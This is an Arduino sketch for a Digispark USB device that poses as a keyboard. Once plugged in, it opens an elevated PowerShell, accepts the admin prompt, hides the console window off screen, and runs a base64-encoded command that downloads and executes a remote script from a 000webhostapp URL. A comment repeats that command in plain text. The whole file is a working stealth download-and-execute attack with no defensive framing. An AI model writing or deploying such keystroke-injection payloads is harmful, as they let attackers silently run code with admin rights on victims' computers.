#include "DigiKeyboard.h"
void setup() {
 pinMode(1, OUTPUT); 
 digitalWrite(1, HIGH); 
 DigiKeyboard.delay(5000);
 DigiKeyboard.sendKeyStroke(0); 
 DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); 
 DigiKeyboard.delay(1000);
 DigiKeyboard.println("powershell Start-Process powershell.exe -verb runAs");
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_RIGHT);
 DigiKeyboard.delay(500);
 DigiKeyboard.println("mode con cols=18 lines=1");
 DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_ALT_RIGHT);
 DigiKeyboard.sendKeyStroke(KEY_M);
 for(int i=0;i<100;i++)
 DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);  
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.println(F("powershell -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AbwBsAGcAdQB5AGkAcwBiAGEAYwBrAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA7AGUAeABpAHQAOwA=;exit"));
 //DigiKeyboard.println(F("IEX (New-Object Net.WebClient).DownloadString('https://coolguyisback.000webhostapp.com/s.ps1');exit;")); ->without encoding <-
 while(1){
   digitalWrite(1, HIGH);
   DigiKeyboard.delay(100);
   digitalWrite(1, LOW);
   DigiKeyboard.delay(100);
 }
}

void loop() {


}
